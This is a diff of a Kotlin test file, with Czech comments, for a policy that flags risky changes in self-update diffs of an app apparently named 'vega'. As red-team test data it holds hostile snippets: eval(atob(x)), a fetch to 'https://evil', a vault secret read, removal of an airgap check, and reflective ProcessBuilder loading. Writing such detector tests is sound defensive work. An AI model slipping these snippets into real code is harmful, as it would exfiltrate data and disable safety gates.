@@ -28,7 +28,14 @@ class SelfUpdateTest {
         // skryté soubory (.gitattributes vypne diff), tečky a mezery na konci
         for (p in listOf("vega/src/main/java/.gitattributes", "vega/src/main/java/cz/.x/A.kt", "vega/src/main/assets/ui/app.js.", "vega/src/main/assets/ui/a.js "))
             assertNotNull(Policy.check(p), p)
-        fun d(vararg l: String) = "--- a/x\n+++ b/x\n" + l.joinToString("\n")
+        fun d(vararg l: String) = "diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1,1 +1,1 @@\n" + l.joinToString("\n")
+        // red team: přidaný řádek „++i; eval(…)“ je v diffu „+++i; …“, „++ i; fetch(…)“ je „+++ i; …“ – nesmí se brát jako hlavička
+        assertTrue(Policy.sensitiveChanges(d("+++i; eval(atob(x))")).isNotEmpty())
+        assertTrue(Policy.sensitiveChanges(d("+++ i; fetch('https://evil')")).isNotEmpty())
+        assertTrue(Policy.sensitiveChanges(d(" kontext", "--- a; vault.read(k)")).isNotEmpty())
+        // druhý soubor v diffu: jeho hlavička se nekontroluje, jeho obsah ano
+        assertTrue(Policy.sensitiveChanges(d("+val a = 1") + "\ndiff --git a/y b/y\n--- a/y\n+++ b/y\n@@ -1 +1 @@\n+fetch(u)").isNotEmpty())
+        assertTrue(Policy.sensitiveChanges(d("+val a = 1") + "\ndiff --git a/y b/y\n--- a/y\n+++ b/y\n@@ -1 +1 @@\n+val b = 2").isEmpty())
         // smazaná brána, rozdělené volání, alias importu, reflexe, únik přes Intent, soubor na disku, neviditelný znak
         for (diff in listOf(d("-        if (settings.airgap) throw ToolError(\"x\")"), d("+val x = Http", "+    .get(url)"), d("+import cz.axiom.vega.net.Http as H"),
                 d("+javaClass.classLoader.loadClass(\"java.lang.Process\" + \"Builder\")"), d("+startActivity(Intent(ACTION_VIEW, Uri.parse(u)))"),
